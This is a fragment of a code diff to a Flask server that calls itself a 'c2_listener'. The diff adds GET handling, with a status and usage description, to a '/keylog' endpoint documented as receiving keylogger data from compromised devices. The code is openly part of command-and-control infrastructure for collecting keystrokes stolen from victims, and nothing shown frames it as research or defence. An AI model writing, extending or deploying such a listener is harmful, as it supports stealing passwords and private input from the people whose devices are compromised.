@@ -68,10 +68,21 @@ def health():
         'service': 'c2_listener'
     })
 
-@app.route('/keylog', methods=['POST'])
+@app.route('/keylog', methods=['GET', 'POST'])
 def receive_keylog():
     """Receive keylogger data from compromised devices"""
     try:
+        # Handle GET requests (for testing/monitoring)
+        if request.method == 'GET':
+            return jsonify({
+                'endpoint': '/keylog',
+                'methods': ['GET', 'POST'],
+                'description': 'Keylogger data reception endpoint',
+                'status': 'operational',
+                'usage': 'POST keylogger data in JSON or text format'
+            }), 200
+
+        # Handle POST requests (actual data reception)
         # Get data from request
         if request.content_type == 'application/json':
             data = request.get_json()
